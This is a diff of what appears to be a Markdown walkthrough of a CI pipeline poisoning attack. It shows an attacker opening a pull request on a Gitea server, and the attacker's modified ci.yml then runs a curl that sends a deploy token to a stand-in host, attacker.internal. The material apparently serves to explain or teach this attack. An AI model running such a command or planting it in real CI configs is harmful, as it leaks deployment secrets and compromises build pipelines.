@@ -62,12 +62,11 @@ git add -A
 git commit -m "Improve CI debugging"
 git push origin feature/improve-ci
 
-curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/pulls" \
+curl -sf -X POST "http://gitea:3000/api/v1/repos/weaklink/wl-webapp/pulls" \
   -H "Content-Type: application/json" \
   -u "attacker:password" \
   -d '{"title":"Improve CI debugging","base":"main","head":"feature/improve-ci"}'
 ```
-
 ### Step 4: The pipeline executes the attacker's config
 
 When CI runs on this PR, it checks out `feature/improve-ci`, reads the modified `ci.yml`, and runs `curl attacker.internal/steal?token=ghp_deploy_x8k2m5n7p9q1r3t6v0w4y`. The deploy token is now in the attacker's hands.
